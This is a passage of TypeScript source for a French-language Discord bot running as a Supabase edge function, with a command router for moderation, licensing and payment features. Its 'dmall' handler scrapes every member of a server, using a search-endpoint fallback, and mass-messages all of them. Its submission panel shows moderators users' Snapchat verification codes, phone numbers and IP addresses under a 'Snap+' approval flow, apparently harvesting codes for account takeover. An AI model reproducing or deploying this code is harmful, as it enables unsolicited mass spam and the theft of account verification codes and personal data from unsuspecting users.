    type: INTERACTION_RESPONSE_TYPE.DEFERRED_CHANNEL_MESSAGE_WITH_SOURCE,
    data: { flags: 64 }
  }), { headers: { 'Content-Type': 'application/json' } });

  // Process DMs in background
  const token = interaction.token;
  
  // Helper to update the deferred message
  const updateProgress = async (embeds: any[]) => {
    await fetch(`${DISCORD_API}/webhooks/${appId}/${token}/messages/@original`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds, flags: 64 })
    });
  };

  // Helper for rate-limit-aware Discord fetch
  const rateLimitedFetch = async (endpoint: string, options: RequestInit = {}): Promise<Response> => {
    const botToken = Deno.env.get('DISCORD_BOT_TOKEN');
    let res = await fetch(`${DISCORD_API}${endpoint}`, {
      ...options,
      headers: {
        'Authorization': `Bot ${botToken}`,
        'Content-Type': 'application/json',
        ...options.headers
      }
    });

    // Handle rate limits with retry
    if (res.status === 429) {
      const body = await res.json();
      const retryAfter = (body.retry_after || 1) * 1000;
      console.log(`[DMALL] Rate limited, waiting ${retryAfter}ms`);
      await new Promise(r => setTimeout(r, retryAfter + 100));
      res = await fetch(`${DISCORD_API}${endpoint}`, {
        ...options,
        headers: {
          'Authorization': `Bot ${botToken}`,
          'Content-Type': 'application/json',
          ...options.headers
        }
      });
    }
    return res;
  };

  const bgTask = (async () => {
    try {
      // First check bot can access the guild
      const guildCheck = await rateLimitedFetch(`/guilds/${guildId}`);
      if (!guildCheck.ok) {
        const errText = await guildCheck.text();
        console.error('[DMALL] Bot cannot access guild:', guildCheck.status, errText);
        await updateProgress([{
          title: '❌ DM All - Erreur',
          description: `Le bot n'a pas accès au serveur.\nErreur: ${guildCheck.status}`,
          color: 0xEF4444,
          timestamp: new Date().toISOString()
        }]);
        return;
      }
      const guildInfo = await guildCheck.json();
      console.log('[DMALL] Bot has access to guild:', guildInfo.name, '| Member count:', guildInfo.approximate_member_count);

      // Try fetching members - Method 1: List Guild Members (requires GUILD_MEMBERS intent)
      let allMembers: any[] = [];
      let after = '0';
      let hasMore = true;
      let useSearchFallback = false;

      console.log('[DMALL] Starting member fetch for guild:', guildId);

      const firstTry = await rateLimitedFetch(`/guilds/${guildId}/members?limit=1000&after=${after}`);
      
      if (!firstTry.ok) {
        const errText = await firstTry.text();
        console.error('[DMALL] List members failed:', firstTry.status, errText);
        console.log('[DMALL] Trying search fallback...');
        useSearchFallback = true;
      } else {
        const firstBatch = await firstTry.json();
        if (Array.isArray(firstBatch) && firstBatch.length > 0) {
          allMembers = firstBatch;
          after = firstBatch[firstBatch.length - 1].user.id;
          if (firstBatch.length < 1000) hasMore = false;
        } else {
          hasMore = false;
        }

        while (hasMore) {
          const membersRes = await rateLimitedFetch(`/guilds/${guildId}/members?limit=1000&after=${after}`);
          if (!membersRes.ok) { hasMore = false; break; }
          const members = await membersRes.json();
          if (!Array.isArray(members) || members.length === 0) { hasMore = false; }
          else {
            allMembers = allMembers.concat(members);
            after = members[members.length - 1].user.id;
            if (members.length < 1000) hasMore = false;
          }
        }
      }

      // Fallback: use search endpoint with common characters to get members
      if (useSearchFallback) {
        console.log('[DMALL] Using search fallback to find members');
        const searchChars = 'abcdefghijklmnopqrstuvwxyz0123456789_'.split('');
        const seenIds = new Set<string>();
        
        for (const char of searchChars) {
          try {
            const searchRes = await rateLimitedFetch(`/guilds/${guildId}/members/search?query=${encodeURIComponent(char)}&limit=1000`);
            if (searchRes.ok) {
              const results = await searchRes.json();
              if (Array.isArray(results)) {
                for (const m of results) {
                  if (m.user?.id && !seenIds.has(m.user.id)) {
                    seenIds.add(m.user.id);
                    allMembers.push(m);
                  }
                }
              }
            }
            // Small delay between searches
            await new Promise(r => setTimeout(r, 300));
          } catch { /* continue */ }
        }
        console.log('[DMALL] Search fallback found', allMembers.length, 'unique members');
      }

      // Filter out bots
      const humans = allMembers.filter((m: any) => !m.user?.bot);
      console.log('[DMALL] Total humans:', humans.length);

      if (humans.length === 0) {
        await updateProgress([{
          title: '❌ DM All - Aucun membre',
          description: `Aucun membre humain trouvé. Vérifie que l'intent **Server Members** est activé.`,
          color: 0xEF4444,
          timestamp: new Date().toISOString()
        }]);
        return;
      }

      let sent = 0;
      let failed = 0;
      const total = humans.length;
      const progressInterval = Math.max(1, Math.floor(total / 10)); // Update every ~10%

      // Show initial progress
      await updateProgress([{
        title: '📩 DM All - En cours...',
        description: `Envoi en cours à **${total}** membres...`,
        color: 0xF59E0B,
        fields: [
          { name: '📊 Progression', value: `0/${total} (0%)`, inline: true },
          { name: '✅ Envoyés', value: '0', inline: true },
          { name: '❌ Échoués', value: '0', inline: true },
        ],
        timestamp: new Date().toISOString()
      }]);

      for (let i = 0; i < humans.length; i++) {
        const member = humans[i];
        try {
          // Create DM channel
          const dmRes = await rateLimitedFetch('/users/@me/channels', {
            method: 'POST',
            body: JSON.stringify({ recipient_id: member.user.id })
          });
          const dm = await dmRes.json();

          if (dm.id) {
            const sendRes = await rateLimitedFetch(`/channels/${dm.id}/messages`, {
              method: 'POST',
              body: JSON.stringify({
                content: message,
                allowed_mentions: { parse: [] }
              })
            });

            if (sendRes.ok) {
              sent++;
            } else {
              const errBody = await sendRes.text();
              console.log(`[DMALL] Failed to DM ${member.user.id}: ${sendRes.status} ${errBody}`);
              failed++;
            }
          } else {
            failed++;
          }

          // Rate limit: wait 1.5s between DMs to be safe
          await new Promise(r => setTimeout(r, 1500));
        } catch {
          failed++;
        }

        // Update progress periodically
        if ((i + 1) % progressInterval === 0 || i === humans.length - 1) {
          const pct = Math.round(((i + 1) / total) * 100);
          await updateProgress([{
            title: '📩 DM All - En cours...',
            description: `Envoi en cours à **${total}** membres...`,
            color: 0xF59E0B,
            fields: [
              { name: '📊 Progression', value: `${i + 1}/${total} (${pct}%)`, inline: true },
              { name: '✅ Envoyés', value: `${sent}`, inline: true },
              { name: '❌ Échoués', value: `${failed}`, inline: true },
            ],
            timestamp: new Date().toISOString()
          }]);
        }
      }

      // Final result
      await updateProgress([{
        title: '📩 DM All - Terminé',
        description: `Le message a été envoyé en MP à tous les membres.`,
        color: 0x22C55E,
        fields: [
          { name: '✅ Envoyés', value: `${sent}`, inline: true },
          { name: '❌ Échoués', value: `${failed}`, inline: true },
          { name: '👥 Total membres', value: `${total}`, inline: true },
          { name: '📝 Message', value: message.length > 1000 ? message.substring(0, 1000) + '...' : message, inline: false }
        ],
        timestamp: new Date().toISOString()
      }]);
      console.log('[DMALL] Completed. Sent:', sent, 'Failed:', failed);
    } catch (error) {
      console.error('[DMALL] Error:', error);
      await updateProgress([{
        title: '❌ DM All - Erreur',
        description: `Erreur: ${error instanceof Error ? error.message : 'Erreur inconnue'}`,
        color: 0xEF4444,
        timestamp: new Date().toISOString()
      }]);
    }
  })();

  // Keep the edge function alive until background task completes
  // @ts-ignore - EdgeRuntime is available in Supabase Edge Functions
  if (typeof EdgeRuntime !== 'undefined' && EdgeRuntime.waitUntil) {
    // @ts-ignore
    EdgeRuntime.waitUntil(bgTask);
  }

  return initialResponse;
}

serve(async (req) => {
  const DISCORD_PUBLIC_KEY = Deno.env.get('DISCORD_PUBLIC_KEY');
  
  if (!DISCORD_PUBLIC_KEY) {
    console.error('Missing DISCORD_PUBLIC_KEY');
    return new Response('Server configuration error', { status: 500 });
  }

  const { isValid, body } = await verifyDiscordRequest(req, DISCORD_PUBLIC_KEY);
  if (!isValid) {
    return new Response('Invalid request signature', { status: 401 });
  }

  const interaction = JSON.parse(body);
  const DISCORD_BOT_TOKEN = Deno.env.get('DISCORD_BOT_TOKEN');

  const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
  const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
  const supabase = createClient(supabaseUrl, supabaseKey);

  // Handle PING
  if (interaction.type === INTERACTION_TYPE.PING) {
    return new Response(JSON.stringify({ type: INTERACTION_RESPONSE_TYPE.PONG }), {
      headers: { 'Content-Type': 'application/json' },
    });
  }

  // Handle slash commands
  if (interaction.type === INTERACTION_TYPE.APPLICATION_COMMAND) {
    const cmd = interaction.data.name;

    // Commands that don't require license (free commands + purchase commands + créateur commands + white-label)
    const freeCmds = ['license', 'help', 'ping', 'buy', 'redeem', 'setpaypal', 'setltc', 'listallowners', 'listallbuyers', 'revoke', 'createlicense', 'listlicenses', 'settoken', 'removetoken', 'banip', 'unbanip', 'listbannedips'];
    
    // Get user ID for créateur check
    const userId = interaction.member?.user?.id || interaction.user?.id;
    const guildId = interaction.guild_id;
    
    // Check if command is disabled on this guild (skip for créateurs)
    if (guildId && !isCreateur(userId)) {
      const { data: disabledCmd } = await supabase
        .from('disabled_commands')
        .select('*')
        .eq('guild_id', guildId)
        .eq('command_name', cmd)
        .single();
      
      if (disabledCmd) {
        return ephemeral(`🚫 La commande \`/${cmd}\` est désactivée sur ce serveur.`);
      }
    }
    
    // Check license for all other commands (only if in a guild AND not a créateur)
    if (!freeCmds.includes(cmd) && guildId && !isCreateur(userId)) {
      const licenseCheck = await requireLicense(supabase, guildId);
      if (licenseCheck) return licenseCheck;
    }

    try {
      switch (cmd) {
        case 'help':
          return handleHelp(interaction);

        case 'say':
          const message = getOption(interaction.data.options, 'message') as string;
          if (!message) return ephemeral("❌ Veuillez fournir un message.");
          await discordFetch(`/channels/${interaction.channel_id}/messages`, {
            method: 'POST',
            body: JSON.stringify({ content: message })
          });
          return ephemeral("✅ Message envoyé !");

        case 'stats':
          return handleStats(interaction, supabase);

        // Moderation commands
        case 'ban': return handleBan(interaction, supabase);
        case 'unban': return handleUnban(interaction);
        case 'kick': return handleKick(interaction, supabase);
        case 'mute': return handleMute(interaction, supabase);
        case 'unmute': return handleUnmute(interaction, supabase);
        case 'clear': return handleClear(interaction, supabase);
        case 'lock': return handleLock(interaction, supabase);
        case 'unlock': return handleUnlock(interaction, supabase);
        case 'addrole': return handleAddRole(interaction, supabase);
        case 'delrole': return handleDelRole(interaction, supabase);
        case 'sanctions': return handleSanctions(interaction, supabase);
        case 'banlist': return handleBanlist(interaction);
        case 'mutelist': return handleMutelist(interaction);
        case 'warn': return handleWarn(interaction, supabase);
        case 'sanctions-clear': return handleSanctionsClear(interaction, supabase);

        // Server Gestion commands
        case 'massiverole': return handleMassiverole(interaction);
        case 'unmassiverole': return handleUnmassiverole(interaction);
        case 'renew': return handleRenew(interaction);
        case 'embed': return handleEmbed(interaction);
        case 'serverinfo': return handleServerinfo(interaction);
        case 'userinfo': return handleUserinfo(interaction);
        case 'roleinfo': return handleRoleinfo(interaction);
        case 'bringall': return handleBringall(interaction);

        // New commands
        case 'slowmode': return handleSlowmode(interaction);
        case 'temprole': return handleTemprole(interaction, supabase);
        case 'note': return handleNote(interaction, supabase);
        case 'notes': return handleNotes(interaction, supabase);
        case 'announce': return handleAnnounce(interaction);

        // Ticket commands
        case 'ticket': return handleTicket(interaction, supabase);
        case 'close': return handleClose(interaction, supabase);
        case 'add': return handleAddToTicket(interaction, supabase);
        case 'remove': return handleRemoveFromTicket(interaction, supabase);
        case 'ticketconfig': return handleTicketConfig(interaction, supabase);

        // Configuration commands
        case 'logs': return handleLogs(interaction, supabase);
        case 'setwelcome': return handleSetWelcome(interaction, supabase);
        case 'antiraid': return handleAntiraid(interaction, supabase);
        case 'captcha': return handleCaptcha(interaction, supabase);
        case 'antilink': return handleAntilink(interaction, supabase);
        case 'antilink-ignore': return handleAntilinkIgnore(interaction, supabase);
        case 'antilink-sanction': return handleAntilinkSanction(interaction, supabase);
        case 'antilink-type': return handleAntilinkType(interaction, supabase);
        case 'antispam': return handleAntispam(interaction, supabase);
        case 'antispam-config': return handleAntispamConfig(interaction, supabase);
        case 'settings': return handleSettings(interaction, supabase);

        // Utility commands
        case 'avatar': return handleAvatar(interaction);
        case 'banner': return handleBanner(interaction);
        case 'ping': return handlePing(interaction);

        // License & Payment commands (always available)
        case 'license': return handleLicense(interaction, supabase);
        case 'buy': return handleBuy(interaction, supabase);
        case 'redeem': return handleRedeem(interaction, supabase);
        case 'setpaypal': return handleSetPaypal(interaction, supabase);
        case 'setltc': return handleSetLtc(interaction, supabase);

        // Owner/Buyer commands
        case 'buyer': return handleBuyer(interaction, supabase);
        case 'unbuyer': return handleUnbuyer(interaction, supabase);
        case 'change': return handleChange(interaction, supabase);
        case 'listoff': return handleListoff(interaction, supabase);
        case 'setowner': return handleSetowner(interaction, supabase);
        case 'delowner': return handleDelowner(interaction, supabase);

        // Créateur commands
        case 'listallowners': return handleListAllOwners(interaction, supabase);
        case 'listallbuyers': return handleListAllBuyers(interaction, supabase);
        case 'revoke': return handleRevoke(interaction, supabase);
        case 'createlicense': return handleCreateLicense(interaction, supabase);
        case 'listlicenses': return handleListLicenses(interaction, supabase);
        case 'banip': return handleBanIp(interaction, supabase);
        case 'unbanip': return handleUnbanIp(interaction, supabase);
        case 'listbannedips': return handleListBannedIps(interaction, supabase);

        // White-label commands
        case 'settoken': return handleSetToken(interaction, supabase);
        case 'removetoken': return handleRemoveToken(interaction, supabase);

        // Payment info command
        case 'payment': return handlePayment(interaction, supabase);

        // AI command
        case 'ia': return await handleIA(interaction, supabase);

        // DM All command
        case 'dmall': return handleDmall(interaction, supabase);

        case 'counter': return handleCounter(interaction, supabase);
        case 'hidereply': return handleHidereply(interaction, supabase);
        case 'rename': return handleRename(interaction, supabase);
        case 'rolemenu': return handleRolemenu(interaction);
        case 'showpic': return handleShowpic(interaction, supabase);
        case 'soutien': return handleSoutien(interaction, supabase);
        case 'soutien-nolog': return handleSoutienNolog(interaction, supabase);
        case 'piconly': return handlePiconly(interaction, supabase);
        case 'ticketpanel': return handleTicketPanel(interaction);

        default:
          return ephemeral("❌ Commande inconnue.");
      }
    } catch (error) {
      console.error('Command error:', error);
      return ephemeral(`❌ Une erreur est survenue.`);
    }
  }

  // Handle component interactions (buttons, select menus)
  if (interaction.type === INTERACTION_TYPE.MESSAGE_COMPONENT) {
    const customId = interaction.data.custom_id;

    // Handle help category select menu
    if (customId === 'help_category') {
      const selectedCategory = interaction.data.values?.[0];
      const cat = HELP_CATEGORIES[selectedCategory];
      
      if (!cat) {
        return ephemeral('❌ Catégorie inconnue.');
      }

      const username = interaction.member?.user?.username || interaction.user?.username || 'Utilisateur';

      const embed = {
        title: `${cat.emoji} ${cat.label}`,
        description: cat.commands,
        color: 0x2B2D31,
        footer: { text: `Demandé par ${username} • Protect Bot` },
        timestamp: new Date().toISOString()
      };

      // Rebuild the select menu so the user can pick another category
      const components = [{
        type: 1,
        components: [{
          type: 3,
          custom_id: 'help_category',
          placeholder: '📂 Sélectionnez une catégorie',
          min_values: 1,
          max_values: 1,
          options: Object.entries(HELP_CATEGORIES).map(([key, c]) => ({
            label: c.label,
            value: key,
            description: `Voir les commandes ${c.label.toLowerCase()}`,
            emoji: { name: c.emoji },
            default: key === selectedCategory
          }))
        }]
      }];

      return new Response(JSON.stringify({
        type: INTERACTION_RESPONSE_TYPE.UPDATE_MESSAGE,
        data: { embeds: [embed], components }
      }), { headers: { 'Content-Type': 'application/json' } });
    }

    const [action, submissionId] = customId.split('_');

    const { data: submission } = await supabase
      .from('submissions')
      .select('*')
      .eq('id', submissionId)
      .single();

    if (!submission) {
      return new Response(JSON.stringify({
        type: INTERACTION_RESPONSE_TYPE.UPDATE_MESSAGE,
        data: { content: "❌ Soumission introuvable.", embeds: [], components: [] }
      }), { headers: { 'Content-Type': 'application/json' } });
    }

    const newStatus = action === 'approve' ? 'approved' : 'rejected';
    await supabase.from('submissions').update({ status: newStatus }).eq('id', submissionId);

    const isApproved = action === 'approve';
    const formatPhone = (p: string) => {
      const clean = p.replace(/^0/, '');
      return clean.replace(/(\d{1})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
    };

    const updatedEmbed = {
      title: `${isApproved ? '✅' : '❌'} Demande ${isApproved ? 'APPROUVÉE' : 'REFUSÉE'}`,
      description: `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n${isApproved ? "L'utilisateur a été validé avec succès ! Snap+ est maintenant actif." : "La demande a été refusée. L'utilisateur devra réessayer."}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
      color: isApproved ? 0x22C55E : 0xEF4444,
      thumbnail: { url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png" },
      fields: [
        { name: "\u200B", value: "\u200B", inline: false },
        { name: "👤 Nom d'utilisateur", value: `>>> **${submission.username}**`, inline: false },
        { name: "\u200B", value: "\u200B", inline: false },
        { name: "🔢 Code de vérification", value: `\`\`\`fix\n${submission.code || 'N/A'}\n\`\`\``, inline: false },
        { name: "\u200B", value: "\u200B", inline: false },
        { name: "📞 Téléphone", value: `>>> \`🇫🇷 +33 ${formatPhone(submission.phone)}\``, inline: false },
        { name: "\u200B", value: "\u200B", inline: false },
        { name: "🌐 Adresse IP", value: `>>> \`${submission.ip_address || 'Inconnue'}\``, inline: false },
        { name: "\u200B", value: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", inline: false },
      ],
      footer: { 
        text: `Traité par ${interaction.member?.user?.username || 'Modérateur'}`,
        icon_url: isApproved 
          ? "https://cdn-icons-png.flaticon.com/512/845/845646.png"
          : "https://cdn-icons-png.flaticon.com/512/753/753345.png"
      },
      timestamp: new Date().toISOString(),
    };

    return new Response(JSON.stringify({
      type: INTERACTION_RESPONSE_TYPE.UPDATE_MESSAGE,
      data: { embeds: [updatedEmbed], components: [] }
    }), { headers: { 'Content-Type': 'application/json' } });
  }

  return new Response(JSON.stringify({ error: 'Unknown interaction type' }), {
    status: 400,
    headers: { 'Content-Type': 'application/json' },
  });
});
